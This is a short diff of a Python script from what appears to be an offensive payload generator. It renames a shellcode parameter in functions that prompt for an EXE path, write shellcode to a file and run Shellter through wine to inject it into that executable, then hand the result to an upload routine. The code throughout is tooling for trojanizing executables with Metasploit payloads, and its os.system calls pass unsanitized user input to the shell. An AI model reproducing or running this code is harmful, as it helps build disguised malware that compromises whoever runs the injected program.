@@ -55,12 +55,12 @@ def askAndReturnModules(shellcode, metasploit_type):
 
     return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
 
-def Shellter(ez2read_shellcode):
+def Shellter(shellcode):
     payloadinexe_payloaddir = raw_input(
         t.bold_green + '[*] EXE Full Filepath: ' + t.normal)
     os.chdir(os.getcwd() + '/shellter')
     with open('payloadbin', 'wb') as Csave:
-        Csave.write(ez2read_shellcode)
+        Csave.write(shellcode)
         Csave.close()
     os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
               payloadinexe_payloaddir)
@@ -71,7 +71,7 @@ def Shellter(ez2read_shellcode):
     DoPayloadUpload(payloadinexe_payloadname)
 
 
-def GeneratePayload(ez2read_shellcode,payloadname):
+def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     want_to_payloadinexe = raw_input(
         t.bold_red + '[*] Inject Shellcode into an EXE (Shellter)? y/[n]: ' + t.normal)
 
@@ -101,7 +101,7 @@ def GeneratePayload(ez2read_shellcode,payloadname):
         CleanUpPayloadMess(payloadname)
         DoPayloadUpload(payloadname)
     else:
-        Shellter(ez2read_shellcode)
+        Shellter(shellcode)
 
 def CleanUpPayloadMess(payloadname):
     os.system('rm %s/logdict*' % os.getcwd())
